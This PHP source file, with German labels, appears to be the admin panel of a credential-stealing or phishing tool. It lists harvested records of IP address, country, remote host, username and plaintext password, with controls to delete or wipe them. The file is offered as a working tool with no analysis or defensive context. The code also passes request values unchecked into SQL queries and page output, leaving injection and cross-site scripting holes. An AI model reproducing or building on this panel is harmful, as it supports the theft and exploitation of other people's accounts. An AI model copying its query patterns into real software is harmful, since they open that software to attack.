<?php
session_start();
require_once('inc/session.php');
require_once('inc/config.php');
require_once('inc/header.php');
require_once('connect/mysql.php');
require_once('classes/pagenavigation.class.php');
?>

<script type="text/javascript">
function AlleBoxen()
 {
   for(var x=0;x<document.boxen.elements.length;x++)
     { var y=document.boxen.elements[x];
       if(y.name!='alle') y.checked=document.boxen.alle.checked;
     }
 }
</script>

<?php
if(isset($_GET['delall'])){
mysql_query("TRUNCATE TABLE `maintable`");
echo '<meta http-equiv="refresh" content="0; URL=logs.php">';
exit;
}

?>

<h2>Logs
<!--<div align="right" style="float:right;"><a href=""> <img src="img/other/.png"></a> </div>-->

<div align="right" style="float:right;">
<?php
if(isset($_GET['p'])){
echo '<a href="logs.php?p=' . $_GET['p'] . '">';
}else{
echo '<a href="logs.php">';
}
?>
<img src="img/other/refresh.png"></a></div>

</h2>

<table id="table" style="width:100%;">
  <tr>

	<th class="table" style="width:16px;" ></th>
    <th class="table" id="kleiner" style="width:85px;" >IP Adress</th>
	<th class="table" style="width:16px;" ></th>
	<th class="table" id="kleiner" style="width:85px;">Host</th>
	<th class="table"  >Username</th>
    <th class="table"  >Password</th>
	<th class="table" style="width:85px;">Zeit & Datum</th>
	<th class="table" id="kleiner">L&ouml;schen</th>
  </tr>
<form action="logs.php" method="post" name="boxen">
<?php
		$count = 1;
		$SQL1 =	"SELECT COUNT(*) FROM `maintable`";
		$SQL2 = "SELECT * FROM `maintable` ORDER BY `Index` DESC LIMIT ";
		$query = mysql_query($SQL1);
		$item_count = mysql_result($query, 0);
		$nav = new PageNavigation($item_count, $pagecount);
		$query = mysql_query($SQL2 . $nav->sql_limit);
		$item_number = $nav->first_item_id;
		
		while($row = mysql_fetch_array($query)){

		$RHostName = mysql_query("SELECT * FROM `remotehosts` WHERE HostName = '" . $row['RemoteHost'] . "'");
		$SQLrow3 = mysql_fetch_row($RHostName);
		$remoteIco = $SQLrow3[2];
		echo '
						<td class="td" style="color: black;width:16px;"><img style="margin-bottom:-1px;" src="img/trace/' . $row['Country'] . '.gif"></td>
					    <td class="td"  id="kleiner" style="color: black;width:85px;">'. $row['IPAdress'].'</td>
						<td class="td"  id="kleiner" style="color: black;width:16px;" id="kleiner" > <img style="margin-bottom:-1px;" src="img/pictures/'. $remoteIco .'"></td>
						<td class="td"  id="kleiner" style="color: black;width:85px;" id="kleiner" >'. $row['RemoteHost'] .'</td>
					    <td class="td" style="color: black;width:16px;" style="color: black;">'. $row['Username'] .'</td>
					    <td class="td"  style="color: black;">'.$row['Password'].'</td>
						<td class="td"  style="color: black;width:85px;">'.$row['Zeit'].' '.$row['Datum'].'</td>
						<td class="td" id="kleiner" style="color: black;"><input type="checkbox" name="dele[]" value="'.$row['Index'].'" /></td></tr>';
						
		$count ++;
		}
		
		
?>

</table>
<br />
<input type="Checkbox" name="alle" onClick="AlleBoxen(this.form);" value="alle">Select all
&nbsp;<input type="submit" class="button" name="del" value="Delete selected Logs" />
</form>
<?php
	echo '<div style="float: right;">'.$nav->createPageBar().'</div><br />';
	require_once('inc/footer.php'); 
?>
<?php
	if(isset($_POST['del'])){
		for ($i=0; $i<count($_POST["dele"]); $i++) {
			$wegdamit = $_POST['dele'][$i];
			mysql_query("DELETE FROM `maintable` WHERE `Index` = '$wegdamit'");
		}
		echo '<script>alert(unescape("'.$i.' Logs successfully deleted!"));</script>
			  <meta http-equiv="refresh" content="0; URL=logs.php">';
	}


	
	
	

?>
